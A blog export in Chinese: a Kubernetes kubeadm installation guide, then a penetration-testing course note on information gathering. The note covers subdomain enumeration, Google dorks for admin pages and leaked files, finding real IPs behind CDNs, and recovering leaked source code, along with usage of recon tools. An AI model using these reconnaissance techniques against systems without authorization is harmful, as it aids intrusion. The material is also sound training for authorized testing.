2.6.6 调整系统时区（所有节点都要操作）# 设置系统时区为 中国/上海timedatectl set-timezone Asia/Shanghai# 将当前的 UTC 时间写入硬件时钟timedatectl set-local-rtc 0# 重启依赖于系统时间的服务systemctl restart rsyslogsystemctl restart crond

2.6.7 设置 rsyslogd 和 systemd journald（所有节点都要操作）# 持久化保存日志的目录mkdir /var/log/journal mkdir /etc/systemd/journald.conf.dcat &gt; /etc/systemd/journald.conf.d/99-prophet.conf &lt;&lt;EOF[Journal]# 持久化保存到磁盘Storage=persistent# 压缩历史日志Compress=yesSyncIntervalSec=5mRateLimitInterval=30sRateLimitBurst=1000# 最大占用空间 10GSystemMaxUse=10G# 单日志文件最大 200MSystemMaxFileSize=200M# 日志保存时间 2 周MaxRetentionSec=2week# 不将日志转发到 syslogForwardToSyslog=noEOFsystemctl restart systemd-journald

2.6.8 kube-proxy开启ipvs的前置条件（所有节点都要操作）cat &lt;&lt;EOF&gt; /etc/sysconfig/modules/ipvs.modules #!/bin/bashmodprobe -- ip_vsmodprobe -- ip_vs_rrmodprobe -- ip_vs_wrrmodprobe -- ip_vs_shmodprobe -- nf_conntrack_ipv4EOFchmod 755 /etc/sysconfig/modules/ipvs.modules &amp;&amp; bash /etc/sysconfig/modules/ipvs.modules &amp;&amp; lsmod | grep -e ip_vs -e nf_conntrack_ipv4

2.6.9 安装 Docker 软件（所有节点都要操作）yum install -y yum-utils device-mapper-persistent-data lvm2yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repoyum install -y docker-ce## 创建 /etc/docker 目录mkdir /etc/dockercat &gt; /etc/docker/daemon.json &lt;&lt;EOF&#123;&quot;exec-opts&quot;: [&quot;native.cgroupdriver=systemd&quot;],&quot;log-driver&quot;: &quot;json-file&quot;,&quot;log-opts&quot;: &#123;&quot;max-size&quot;: &quot;100m&quot;&#125;&#125;EOFmkdir -p /etc/systemd/system/docker.service.d# 重启docker服务systemctl daemon-reload &amp;&amp; systemctl restart docker &amp;&amp; systemctl enable docker

上传文件到/etc/yum.repos.d/目录下，也可以 代替 yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo 命令
docker-ce.repo
[docker-ce-stable]name=Docker CE Stable - $basearchbaseurl=https://mirrors.aliyun.com/docker-ce/linux/centos/$releasever/$basearch/stableenabled=1gpgcheck=1gpgkey=https://mirrors.aliyun.com/docker-ce/linux/centos/gpg[docker-ce-stable-debuginfo]name=Docker CE Stable - Debuginfo $basearchbaseurl=https://mirrors.aliyun.com/docker-ce/linux/centos/$releasever/debug-$basearch/stableenabled=0gpgcheck=1gpgkey=https://mirrors.aliyun.com/docker-ce/linux/centos/gpg[docker-ce-stable-source]name=Docker CE Stable - Sourcesbaseurl=https://mirrors.aliyun.com/docker-ce/linux/centos/$releasever/source/stableenabled=0gpgcheck=1gpgkey=https://mirrors.aliyun.com/docker-ce/linux/centos/gpg[docker-ce-test]name=Docker CE Test - $basearchbaseurl=https://mirrors.aliyun.com/docker-ce/linux/centos/$releasever/$basearch/testenabled=0gpgcheck=1gpgkey=https://mirrors.aliyun.com/docker-ce/linux/centos/gpg[docker-ce-test-debuginfo]name=Docker CE Test - Debuginfo $basearchbaseurl=https://mirrors.aliyun.com/docker-ce/linux/centos/$releasever/debug-$basearch/testenabled=0gpgcheck=1gpgkey=https://mirrors.aliyun.com/docker-ce/linux/centos/gpg[docker-ce-test-source]name=Docker CE Test - Sourcesbaseurl=https://mirrors.aliyun.com/docker-ce/linux/centos/$releasever/source/testenabled=0gpgcheck=1gpgkey=https://mirrors.aliyun.com/docker-ce/linux/centos/gpg[docker-ce-nightly]name=Docker CE Nightly - $basearchbaseurl=https://mirrors.aliyun.com/docker-ce/linux/centos/$releasever/$basearch/nightlyenabled=0gpgcheck=1gpgkey=https://mirrors.aliyun.com/docker-ce/linux/centos/gpg[docker-ce-nightly-debuginfo]name=Docker CE Nightly - Debuginfo $basearchbaseurl=https://mirrors.aliyun.com/docker-ce/linux/centos/$releasever/debug-$basearch/nightlyenabled=0gpgcheck=1gpgkey=https://mirrors.aliyun.com/docker-ce/linux/centos/gpg[docker-ce-nightly-source]name=Docker CE Nightly - Sourcesbaseurl=https://mirrors.aliyun.com/docker-ce/linux/centos/$releasever/source/nightlyenabled=0gpgcheck=1gpgkey=https://mirrors.aliyun.com/docker-ce/linux/centos/gpg

2.6.10 安装 Kubeadm （所有节点都要操作）cat &lt;&lt;EOF &gt; /etc/yum.repos.d/kubernetes.repo[kubernetes]name=Kubernetesbaseurl=http://mirrors.aliyun.com/kubernetes/yum/repos/kubernetes-el7-x86_64enabled=1gpgcheck=0repo_gpgcheck=0gpgkey=http://mirrors.aliyun.com/kubernetes/yum/doc/yum-key.gpghttp://mirrors.aliyun.com/kubernetes/yum/doc/rpm-package-key.gpgEOFyum install -y kubelet-1.21.1 kubeadm-1.21.1 kubectl-1.21.1 &amp;&amp; systemctl enable kubelet

2.7 部署Kubernetes Master2.7.1 初始化主节点（主节点操作）kubeadm init --apiserver-advertise-address=192.168.5.3 --image-repository registry.aliyuncs.com/google_containers --kubernetes-version v1.21.1 --service-cidr=10.96.0.0/12 --pod-network-cidr=10.244.0.0/16mkdir -p $HOME/.kubesudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/configsudo chown $(id -u):$(id -g) $HOME/.kube/config

2.7.2 加入主节点以及其余工作节点kubeadm join 192.168.5.3:6443 --token h0uelc.l46qp29nxscke7f7 \        --discovery-token-ca-cert-hash sha256:abc807778e24bff73362ceeb783cc7f6feec96f20b4fd707c3f8e8312294e28f 

2.7.3 部署网络kubectl apply -f https://raw.githubusercontent.com/coreos/flannel/master/Documentation/kube-flannel.yml

下边是文件
---apiVersion: policy/v1beta1kind: PodSecurityPolicymetadata:  name: psp.flannel.unprivileged  annotations:    seccomp.security.alpha.kubernetes.io/allowedProfileNames: docker/default    seccomp.security.alpha.kubernetes.io/defaultProfileName: docker/default    apparmor.security.beta.kubernetes.io/allowedProfileNames: runtime/default    apparmor.security.beta.kubernetes.io/defaultProfileName: runtime/defaultspec:  privileged: false  volumes:  - configMap  - secret  - emptyDir  - hostPath  allowedHostPaths:  - pathPrefix: &quot;/etc/cni/net.d&quot;  - pathPrefix: &quot;/etc/kube-flannel&quot;  - pathPrefix: &quot;/run/flannel&quot;  readOnlyRootFilesystem: false  # Users and groups  runAsUser:    rule: RunAsAny  supplementalGroups:    rule: RunAsAny  fsGroup:    rule: RunAsAny  # Privilege Escalation  allowPrivilegeEscalation: false  defaultAllowPrivilegeEscalation: false  # Capabilities  allowedCapabilities: [&#x27;NET_ADMIN&#x27;, &#x27;NET_RAW&#x27;]  defaultAddCapabilities: []  requiredDropCapabilities: []  # Host namespaces  hostPID: false  hostIPC: false  hostNetwork: true  hostPorts:  - min: 0    max: 65535  # SELinux  seLinux:    # SELinux is unused in CaaSP    rule: &#x27;RunAsAny&#x27;---kind: ClusterRoleapiVersion: rbac.authorization.k8s.io/v1metadata:  name: flannelrules:- apiGroups: [&#x27;extensions&#x27;]  resources: [&#x27;podsecuritypolicies&#x27;]  verbs: [&#x27;use&#x27;]  resourceNames: [&#x27;psp.flannel.unprivileged&#x27;]- apiGroups:  - &quot;&quot;  resources:  - pods  verbs:  - get- apiGroups:  - &quot;&quot;  resources:  - nodes  verbs:  - list  - watch- apiGroups:  - &quot;&quot;  resources:  - nodes/status  verbs:  - patch---kind: ClusterRoleBindingapiVersion: rbac.authorization.k8s.io/v1metadata:  name: flannelroleRef:  apiGroup: rbac.authorization.k8s.io  kind: ClusterRole  name: flannelsubjects:- kind: ServiceAccount  name: flannel  namespace: kube-system---apiVersion: v1kind: ServiceAccountmetadata:  name: flannel  namespace: kube-system---kind: ConfigMapapiVersion: v1metadata:  name: kube-flannel-cfg  namespace: kube-system  labels:    tier: node    app: flanneldata:  cni-conf.json: |    &#123;      &quot;name&quot;: &quot;cbr0&quot;,      &quot;cniVersion&quot;: &quot;0.3.1&quot;,      &quot;plugins&quot;: [        &#123;          &quot;type&quot;: &quot;flannel&quot;,          &quot;delegate&quot;: &#123;            &quot;hairpinMode&quot;: true,            &quot;isDefaultGateway&quot;: true          &#125;        &#125;,        &#123;          &quot;type&quot;: &quot;portmap&quot;,          &quot;capabilities&quot;: &#123;            &quot;portMappings&quot;: true          &#125;        &#125;      ]    &#125;  net-conf.json: |    &#123;      &quot;Network&quot;: &quot;10.244.0.0/16&quot;,      &quot;Backend&quot;: &#123;        &quot;Type&quot;: &quot;vxlan&quot;      &#125;    &#125;---apiVersion: apps/v1kind: DaemonSetmetadata:  name: kube-flannel-ds  namespace: kube-system  labels:    tier: node    app: flannelspec:  selector:    matchLabels:      app: flannel  template:    metadata:      labels:        tier: node        app: flannel    spec:      affinity:        nodeAffinity:          requiredDuringSchedulingIgnoredDuringExecution:            nodeSelectorTerms:            - matchExpressions:              - key: kubernetes.io/os                operator: In                values:                - linux      hostNetwork: true      priorityClassName: system-node-critical      tolerations:      - operator: Exists        effect: NoSchedule      serviceAccountName: flannel      initContainers:      - name: install-cni        image: quay.io/coreos/flannel:v0.14.0        command:        - cp        args:        - -f        - /etc/kube-flannel/cni-conf.json        - /etc/cni/net.d/10-flannel.conflist        volumeMounts:        - name: cni          mountPath: /etc/cni/net.d        - name: flannel-cfg          mountPath: /etc/kube-flannel/      containers:      - name: kube-flannel        image: quay.io/coreos/flannel:v0.14.0        command:        - /opt/bin/flanneld        args:        - --ip-masq        - --kube-subnet-mgr        resources:          requests:            cpu: &quot;100m&quot;            memory: &quot;50Mi&quot;          limits:            cpu: &quot;100m&quot;            memory: &quot;50Mi&quot;        securityContext:          privileged: false          capabilities:            add: [&quot;NET_ADMIN&quot;, &quot;NET_RAW&quot;]        env:        - name: POD_NAME          valueFrom:            fieldRef:              fieldPath: metadata.name        - name: POD_NAMESPACE          valueFrom:            fieldRef:              fieldPath: metadata.namespace        volumeMounts:        - name: run          mountPath: /run/flannel        - name: flannel-cfg          mountPath: /etc/kube-flannel/      volumes:      - name: run        hostPath:          path: /run/flannel      - name: cni        hostPath:          path: /etc/cni/net.d      - name: flannel-cfg        configMap:          name: kube-flannel-cfg

六.修改Pod数量限制题目要求
Kubernetes 默认每个节点只能启动 110 个 Pod，由于业务需要，将每个节点默认限制的Pod 数量改为 200。
1.方法一①在Node上 设置打开文件&#x2F;var&#x2F;lib&#x2F;kubelet&#x2F;config.yamlvi  /var/lib/kubelet/config.yaml

②修改参数maxPods为指定的值：
③重启kubeletsystemctl daemon-reloadsystemctl restart kubelet

④查看Pod数量kubectl describe node   |  grep -i &quot;Capacity\|Allocatable&quot; -A 6

2.方法二①编辑kubelet环境配置文件，添加参数vi /etc/sysconfig/kubeletKUBELET_EXTRA_ARGS=&quot;--max-pods=200&quot;

②编辑kubelet服务文件，写入环境文件路径vi /usr/lib/systemd/system/kubelet.service[Service]Environment=-/etc/sysconfig/kubele

②重启kubeletsystemctl daemon-reloadsystemctl restart kubelet

七.修改 NodePort 端口范围1.修改kube-apiserver.yaml 文件使用 kubeadm 安装 K8S 集群的情况下，您的 Master 节点上会有一个文件 &#x2F;etc&#x2F;kubernetes&#x2F;manifests&#x2F;kube-apiserver.yaml，修改此文件，向command添加 –service-node-port-range&#x3D;20000-65535 （请使用您自己需要的端口范围），如下所示：
vi /etc/kubernetes/manifests/kube-apiserver.yamlapiVersion: v1kind: Podmetadata:  creationTimestamp: null  labels:    component: kube-apiserver    tier: control-plane  name: kube-apiserver  namespace: kube-systemspec:  containers:  - command:    - kube-apiserver    - --advertise-address=172.17.216.80    - --allow-privileged=true    - --authorization-mode=Node,RBAC    - --client-ca-file=/etc/kubernetes/pki/ca.crt    - --enable-admission-plugins=NodeRestriction    - --enable-bootstrap-token-auth=true    - --etcd-cafile=/etc/kubernetes/pki/etcd/ca.crt    - --etcd-certfile=/etc/kubernetes/pki/apiserver-etcd-client.crt    - --etcd-keyfile=/etc/kubernetes/pki/apiserver-etcd-client.key    - --etcd-servers=https://127.0.0.1:2379    - --insecure-port=0    - --kubelet-client-certificate=/etc/kubernetes/pki/apiserver-kubelet-client.crt    - --kubelet-client-key=/etc/kubernetes/pki/apiserver-kubelet-client.key    - --kubelet-preferred-address-types=InternalIP,ExternalIP,Hostname    - --proxy-client-cert-file=/etc/kubernetes/pki/front-proxy-client.crt    - --proxy-client-key-file=/etc/kubernetes/pki/front-proxy-client.key    - --requestheader-allowed-names=front-proxy-client    - --requestheader-client-ca-file=/etc/kubernetes/pki/front-proxy-ca.crt    - --requestheader-extra-headers-prefix=X-Remote-Extra-    - --requestheader-group-headers=X-Remote-Group    - --requestheader-username-headers=X-Remote-User    - --secure-port=6443    - --service-account-key-file=/etc/kubernetes/pki/sa.pub    - --service-cluster-ip-range=10.96.0.0/12    - --service-node-port-range=20000-22767    - --tls-cert-file=/etc/kubernetes/pki/apiserver.crt    - --tls-private-key-file=/etc/kubernetes/pki/apiserver.key    image: registry.cn-hangzhou.aliyuncs.com/google_containers/kube-apiserver:v1.16.0    imagePullPolicy: IfNotPresent    livenessProbe:      failureThreshold: 8      httpGet:        host: 172.17.216.80        path: /healthz        port: 6443        scheme: HTTPS      initialDelaySeconds: 15      timeoutSeconds: 15

2.重启APIServer
# 获得 apiserver 的 pod 名字export apiserver_pods=$(kubectl get pods --selector=component=kube-apiserver -n kube-system --output=jsonpath=&#123;.items..metadata.name&#125;)# 删除 apiserver 的 podkubectl delete pod $apiserver_pods -n kube-system

3.验证成果
kubectl describe pod $apiserver_pods -n kube-system

]]></content>
      <categories>
        <category>云计算</category>
        <category>基础知识</category>
      </categories>
      <tags>
        <tag>云计算</tag>
        <tag>Kubernetes</tag>
      </tags>
  </entry>
  <entry>
    <title>老男孩--信息收集(1)</title>
    <url>/posts/3b40f62a.html</url>
    <content><![CDATA[信息收集
本文章由GeekY编写，仅供学习和研究使用,请勿使用项目的技术手段用于非法用途,任何人造成的任何负面影响,与本人无关。
本文档所有内容、新闻皆不代表本人态度、立场
不会收取任何广告费用,展示的所有工具链接与本人无任何利害关系

理论部分渗透流程1.明确目标
​	确定范围：渗透测试的目标范围、IP、域名、内外网
​	确定规则：可以渗透到什么程度、时间有什么要求？是否可以修改上传（木马是否允许上传）？能否提权等
​	确定需求：web应用的漏洞（新上线的程序）？业务逻辑漏洞（针对业务的）？
​		通知客户数据库备份、源代码备份
​		禁止登陆扫描
​		降低扫描线程
​		增删改一定要手工进行
​		禁止脱裤、跑数据、传shell、发起DOS、DDOS攻击
2.信息收集
​	收集方式：主动扫描、开放搜索（利用搜索引擎获得后台、未授权页面、敏感URL等）
​	基础信息：IP，网段，域名，端口
​	系统信息：操作系统版本
​	应用信息：各端口的应用，如web应用、邮件应用、DNS服务等
​	版本信息：所有这些探测到的版本
​	人员信息：域名注册人员信息，web应用中网站发帖人ID，管理员姓名等
​	防护信息：是否能测试到防护设备
3.漏洞探测
​	漏扫：AWVS、IBM appscan
​	系统漏洞：未及时打补丁
​	web漏洞：web应用开发问题
​	结合漏洞寻找poc
4.漏洞验证（需要确认）
​	将上述所有漏洞全部验证一遍
​	自动化验证：结合自动化工具进行验证
​	手工验证：SQL注入，XSS测试
​	登录猜解：弱密码
5.信息分析
​	用漏洞实行精准打击
​	定制攻击路径、绕过检测机制、攻击代码
6.获取所需
​	获取内部信息：基础设施（网络连接、vpn、路由、拓扑）
​	进一步渗透：内网入侵，敏感目标
​	清理痕迹：清理相关日志和木马、上传文件等
7.信息整理
​	整理渗透工具：用的代码，poc，exp等
​	整理收集信息：整理收集到的信息
​	整理漏洞信息：整理渗透过程中的漏洞
8.形成报告
​	漏洞成因，验证过程，带来的危害分析、修补建议
信息收集二级域名 二级域名、C端、旁站、二级域名收集子域名方法一： DNS域传送漏洞
#通过kail 的dnsenum工具获取dns域中域名kali&gt; dnsenum 【域名】#注意收集的域名信息包含CDN的IP地址，需要进行过滤CDN：简单理解为WEB网站的缓存服务器，分布在不同节点实现网站的快速访问

收集子域名方法二：备案号查询

查询网址：
​	ICP网站域名备案查询网
​	https://www.tianyancha.com/
​	icp备案查询_网站备案查询_域名备案查询_APP备案查询_小程序备案查询_快应用备案查询_爱站网
​	http://cha.fute.com/index
​	零零信安 | ASM | 攻击面 | 外部攻击面管理专家 | 比攻击者更快一步了解您自己的风险

注意：备案号一般存放在门户网站的最底部

收集子域名方法三：SSL证书
SSL证书查找方法：



寻找方法：
​	①找到渗透门户网站，点击锁图标查看https的证书信息
​	②点击右上角证书图标，找到证书字段中的序列号
​	③需要将改字段值转换为十进制，通过Burp Suit软件、在线转换工具直接转换即可
查询网站：
​	SSL状态检测
​	SSL证书在线检测工具-中国数字证书CHINASSL
收集子域名方法四：利用反编译工具收集域名信息
​	通过AndroidKiller反编译器，里面可以查找相关的公司域名和ip地址信息
收集子域名方法五：微信公众号提取
​	通过开启手机代理，实现BurpSuit与手机的联动，抓包分析
​	搜狗：https://weixin.sogou.com
收集子域名方法六：暴力破解
​	即利用枚举法通过字典的形式，进行暴力破解，获取二级域名
查询网站：
​	在线子域名爆破-JAVASEC
​	Subdomain - RapidDNS Rapid DNS Information Collection
​	子域名查询 查子域名 查子站 子域名大全 二级域名查询 查子域
​	子域名查询 - dnsgrep
​	DNSDumpster - Find &amp; lookup dns records for recon &amp; research
​	
工具：

OneForAll：https://github.com/shmilylty/OneForAll
ksudbomain：https://github.com/knownsec/ksubdomain
subDomainsBrute：https://github.com/lijiejie/subDomainsBrute
Sublist3r:  https://github.com/aboul3la/Sublist3r
子域名挖掘机：https://github.com/euphrat1ca/LayerDomainFinder
dirsearch：https://github.com/maurosoria/dirsearch

收集子域名方法七：利用域名信息历史注册记录
查询网站：
​	域名Whois查询 - 站长工具
​	WHOIS 域名查询 - 查找网站所有者 - GoDaddy CN
​	通过WHOIS历史信息查询访问域名历史 | WhoisXML API
收集子域名方法八：利用域名信息历史注册记录
1）百度 谷歌
​	site:oldboyedu.com  –根据主域信息进行检索
​	intitle：老男孩教育   –根据企业名称进行检索
2） 空间搜索引擎

FOFA: https://fofa.info

Quake：https://quake.360.cn/quake/#/index

Shadon：https://www.shodan.io

基础语法：https://blog.csdn.net/Vdieoo/article/details/109622838


ZoomEye：https://www.zoomeye.org


收集子域名方法九：利用网站js文件提取二级域名
工具：
​	jfFinder
C端、旁站收集​	获取其他域名信息&#x2F;获取其他局域网主机地址信息
在线网站：
​	网站IP查询_IP反查域名_同IP网站查询 - 站长工具
​	域名查iP 域名解析 iP查询网站 iP反查域名 iP反查网站 同一iP网站 同iP网站域名iP查询
​	
工具：
​	Goby— 资产绘测及实战化漏洞扫描工具
​	御剑
​	Nmap: the Network Mapper - Free Security Scanner
​	K8、IISPutScanner	(前提条件要获取到网站的真实ip)
威胁分析​	微步在线X情报社区-威胁情报查询_威胁分析平台_开放社区
​	360安全大脑
​	奇安信威胁情报中心
敏感信息收集Web源代码泄露​	1）收集源代码备份信息
​		利用7kbscan工具
​	2）收集特定站点目录中的扩展文件
​		.git 目录信息泄露，也可以通过（GitHack）.git目录获取源代码
​		.DS_store 仿照7kbscan字典形式创建&#x2F;【目录名】&#x2F;.DS_store字典并进行扫描
​			通过 ds_store_exp.py 【.DS_store路径】递归下载到本地
​		.svn 仿照7kbscan字典形式创建.svp字典并进行扫描
​			通过seay svn添加网站实现源码下载
​		.hg等……
​	3）社工信息泄露
​		泄露敏感信息注册到一些网站（手机号 身份号 QQ 微信）
GooleHackhttps://cn.bing.com/
1.后台地址

site:xxx.com 管理后台&#x2F;登录&#x2F;管理员&#x2F;系统，可以通过添加双引号增加精确度
site:xxx.com inurl:login&#x2F;admin&#x2F;system&#x2F;guanli&#x2F;demglu

2.敏感文件

site:xxx.com filetype:pdf&#x2F;doc&#x2F;xls&#x2F;txt
site:xxx.com filetype:log&#x2F;sql.conf

3.测试环境

site: xxx.com inurl:test&#x2F;ceshi
site: xxx.com intitle:测试&#x2F;后台

4.邮箱&#x2F;QQ&#x2F;群

site: xxx.com 邮件&#x2F;email
site: xxx.com qq&#x2F;群&#x2F;企鹅&#x2F;腾讯
site: xxx.com intitle:”Outlook Web App”  邮件服务器web界面
site: xxx.com intitle:”mail”
site: xxx.com intitle:”webmail”

5.其他

site:xxx.com inurl:api
site:xxx.com inurl:uid&#x3D;&#x2F;id&#x3D;
site:xxx.com intitle:index of “server at”

历史漏洞信息收集在线网站：
​	补天地址：https://www.butian.net/
​	漏洞银行：https://m.bugbank.cn/
​	乌云网址：https://wy.zone.ci/index.php
​	CNVD:  https://www.cnvd.org.cn/
​	CNNVD：http://www.cnnvd.org.cn
​	Seebug：https://www.seebug.org
​	Exploit Database：https://www.exploit-db.com
​	Sploitus：https://sploitus.com
网盘引擎
盘搜搜：http://www.pansoso.org
盘多多：http://www.panduoduo.net
大力盘：https://dalipan.com

指纹识别​	指纹识别就是识别搭建网站的方式（dedecms、wordpress、edusoho、wencenter 、jira）

cms平台        ：完整内容管理平台（适合搭建官方网站）
dz   平台	：论坛
edusoho       ：线上视频网站
wecenter      ：线上社交平台
JIRA		:  项目管理平台
confluence   ：企业内部网盘	
wordpress    ：博客系统

在线网站：

火狐插件：Wappalyzer
云悉：http://www.yunsee.cn
whatweb：https://www.whatweb.net
在线：http://whatweb.bugscaner.com/look
Nucle：https://github.com/projectdiscovery/nuclei
潮汐：http://finger.tidesec.net/

使用御剑增强版也可以识别网站指纹信息
网站安全程序识别方法kali自动集成
https://github.com/EnableSecurity/wafw00f
进行程序安装：python setup.py install
软件程序测试： 进入wafw00f目录执行main.py www.safedog.cn
CDN识别
通过Ping一个不存在的二级域名获取真实ip或没有挂cdn的域名（主要是通过泛域名解析）
利用fofa语法title标签获取真实ip
DNS历史记录
https://sitereport.net.craft.com/?url=https://www.oldboyedu.com


是否存在phpinfo.php（在phpinfo中的SERVER_ADDR或者SERVER[“”SERVER_ADDR]）找到真实IP
通过国外VPS Ping

在线工具
真实ip

全球ping：https://www.wepcc.com
dns检测：https://tools.ipip.net/dns.php
Xcdn：https://github.com/3xp10it/xcdn
在线：https://ipchaxun.com

工具参考Dnsenum（DNS域传输漏洞）工具介绍：DNS域传送漏洞（KALI）收集一个域的信息，通过谷歌或者字典文件猜测可能存在的域名
#用法dnsenum 【选项】 &lt;域&gt;常用选项：	--dnsserver &lt;server&gt;	选择解析的DNS服务器	-v 						显示详细信息	-f						从此文件中读取子域进行暴力破解	--noreverse				跳过反向查找操作

oneForAll 子域名收集器项目地址：https://github.com/shmilylty/OneForAll
oneforall 依赖安装
cd OneForAll/python3 -m pip install -U pip setuptools wheel -i https://mirrors.aliyun.com/pypi/simple/pip3 install -r requirements.txt -i https://mirrors.aliyun.com/pypi/simple/python3 oneforall.py --help



oneforall使用方法
#运行示例python3 oneforall.py --target example.com.cn run#使用字典进行搜集python3 oneforall.py --targets ./example.txt run

运行结束后会在相应文件夹产生结果文件


需要python 3.6.0以上环境才能运行
使用 python 3.11 及以上版本时oneforall会出现一个 cannot import name ‘sre_parse’ from ‘re’ 的报错：
修复方法
​	pip uninstall exrex 
​	pip install exrex

ksubdomain 无状态子域名爆破工具工具特点：ksubdomain的发送和接收是分离不依赖系统的，所以速度快
项目地址：knownsec&#x2F;ksubdomain: 无状态子域名爆破工具
#常用命令：使用内置字典爆破ksubdomain -d seebug.org使用字典爆破域名ksubdomain -d seebug.org -f subdomains.dict字典里都是域名，可使用验证模式ksubdomain -f dns.txt -verify爆破三级域名ksubdomain -d seebug.org -l 2通过管道爆破echo &quot;seebug.org&quot;|ksubdomain通过管道验证域名echo &quot;paper.seebug.org&quot;|ksubdomain -verify仅使用网络API接口获取域名ksubdomain -d seebug.org -api完整模式,先使用网络API，在此基础使用内置字典进行爆破ksubdomain -d seebug.org -fullSummary整理功能ksubdomain -d seebug.org -summary

#相关参数  -api        使用网络接口  -b string        宽带的下行速度，可以5M,5K,5G (default &quot;1M&quot;)  -check-origin        会从返回包检查DNS是否为设定的，防止其他包的干扰  -csv        输出excel文件  -d string        爆破域名  -dl string        从文件中读取爆破域名  -e int        默认网络设备ID,默认-1，如果有多个网络设备会在命令行中选择 (default -1)  -f string        字典路径,-d下文件为子域名字典，-verify下文件为需要验证的域名  -filter-wild        自动分析并过滤泛解析，最终输出文件，需要与&#x27;-o&#x27;搭配  -full        完整模式，使用网络接口和内置字典  -l int        爆破域名层级,默认爆破一级域名 (default 1)  -list-network        列出所有网络设备  -o string        输出文件路径  -s string        resolvers文件路径,默认使用内置DNS  -sf string        三级域名爆破字典文件(默认内置)  -silent        使用后屏幕将仅输出域名  -skip-wild        跳过泛解析的域名  -summary        在扫描完毕后整理域名归属asn以及IP段  -test        测试本地最大发包数  -ttl        导出格式中包含TTL选项  -verify        验证模式



subDomainsBrute 暴力域名枚举工具工具特点：高并发的DNS暴力枚举工具，支持Python3.6+和Python2.7，建议使用Python3.8+。
项目地址：lijiejie&#x2F;subDomainsBrute: A fast sub domain brute tool for pentesters
使用方法：
Usage: subDomainsBrute.py [options] target.comOptions:  --version             show program&#x27;s version number and exit  -h, --help            show this help message and exit  -f FILE               File contains new line delimited subs, default is                        subnames.txt.  --full                Full scan, NAMES FILE subnames_full.txt will be used                        to brute  -i, --ignore-intranet                        Ignore domains pointed to private IPs  -w, --wildcard        Force scan after wildcard test failed  -t THREADS, --threads=THREADS                        Num of scan threads, 500 by default  -p PROCESS, --process=PROCESS                        Num of scan process, 6 by default  --no-https            Disable get domain names from HTTPS cert, this can                        save some time  -o OUTPUT, --output=OUTPUT                        Output file name. default is &#123;target&#125;.txt

Sublist3r 子域名枚举工具工具特点：Sublist3r 是一个 python 工具，旨在使用 OSINT 枚举网站的子域。它可以帮助渗透测试人员和错误猎人收集和收集他们所针对的域的子域。Sublist3r 使用许多搜索引擎（如 Google、Yahoo、Bing、Baidu 和 Ask）列举子域。Sublist3r 还使用 Netcraft、Virustotal、ThreatCrowd、DNSdumpster 和 ReverseDNS 枚举子域。
项目地址：aboul3la&#x2F;Sublist3r：用于渗透测试人员的快速子域枚举工具
使用方法：
获取基本选项帮助python sublist3r.py -h要枚举特定域的子域python sublist3r.py -d example.com要枚举特定域的子域并仅显示具有开放端口 80 和 443 的子域 python sublist3r.py -d example.com -p 80,443要枚举子域并启用 bruteforce 模块python sublist3r.py -b -d example.com

相关参数

Layer 子域名挖掘机项目地址：euphrat1ca&#x2F;LayerDomainFinder: Layer子域名挖掘机

输入对应的域名直接开始扫描即可
jsFinder 扫描js文件提取二级域名JSFinder是一款用作快速在网站的js文件中提取URL，子域名的工具。
项目代码：Threezh1&#x2F;JSFinder: JSFinder is a tool for quickly extracting URLs and subdomains from JS files on a website.
使用方法：
#简单爬取（爬取这单个页面的所有js连接，并在其中发现url和子域名）python JSFinder.py -u http://www.mi.com#深度爬取（使用-ou和-os 指定保存的URL和子域名的文件名）python JSFinder.py -u http://www.mi.com -d -ou mi_url.txt -os mi_subdomain.txt



subfinder 子域发现工具subfinder是一种子域发现工具，它使用被动在线资源返回网站的有效子域。它具有简单的模块化架构，并针对速度进行了优化。 专为 只做一件事 - 被动子域枚举，它做得很好
项目地址：projectdiscovery&#x2F;subfinder: Fast passive subdomain enumeration tool.
使用方法：
Usage:  ./subfinder [flags]Flags:INPUT:  -d, -domain string[]  domains to find subdomains for  -dL, -list string     file containing list of domains for subdomain discoverySOURCE:  -s, -sources string[]           specific sources to use for discovery (-s crtsh,github). Use -ls to display all available sources.  -recursive                      use only sources that can handle subdomains recursively (e.g. subdomain.domain.tld vs domain.tld)  -all                            use all sources for enumeration (slow)  -es, -exclude-sources string[]  sources to exclude from enumeration (-es alienvault,zoomeyeapi)FILTER:  -m, -match string[]   subdomain or list of subdomain to match (file or comma separated)  -f, -filter string[]   subdomain or list of subdomain to filter (file or comma separated)RATE-LIMIT:  -rl, -rate-limit int  maximum number of http requests to send per second  -rls value            maximum number of http requests to send per second for providers in key=value format (-rls &quot;hackertarget=10/s,shodan=15/s&quot;)  -t int                number of concurrent goroutines for resolving (-active only) (default 10)UPDATE:  -up, -update                 update subfinder to latest version  -duc, -disable-update-check  disable automatic subfinder update checkOUTPUT:  -o, -output string       file to write output to  -oJ, -json               write output in JSONL(ines) format  -oD, -output-dir string  directory to write output (-dL only)  -cs, -collect-sources    include all sources in the output (-json only)  -oI, -ip                 include host IP in output (-active only)CONFIGURATION:  -config string                flag config file (default &quot;$CONFIG/subfinder/config.yaml&quot;)  -pc, -provider-config string  provider config file (default &quot;$CONFIG/subfinder/provider-config.yaml&quot;)  -r string[]                   comma separated list of resolvers to use  -rL, -rlist string            file containing list of resolvers to use  -nW, -active                  display active subdomains only  -proxy string                 http proxy to use with subfinder  -ei, -exclude-ip              exclude IPs from the list of domainsDEBUG:  -silent             show only subdomains in output  -version            show version of subfinder  -v                  show verbose output  -nc, -no-color      disable color in output  -ls, -list-sources  list all available sourcesOPTIMIZATION:  -timeout int   seconds to wait before timing out (default 30)  -max-time int  minutes to wait for enumeration results (default 10)







EHole棱洞系统指纹探测工具EHole是一款对资产中重点系统指纹识别的工具，在红队作战中，信息收集是必不可少的环节，如何才能从大量的资产中提取有用的系统(如OA、VPN、Weblogic…)。EHole旨在帮助红队人员在信息收集期间能够快速从C段、大量杂乱的资产中精准定位到易被攻击的系统，从而实施进一步攻击。
项目地址：EdgeSecurityTeam&#x2F;EHole: EHole(棱洞)3.0 重构版-红队重点攻击系统指纹探测工具
参数信息
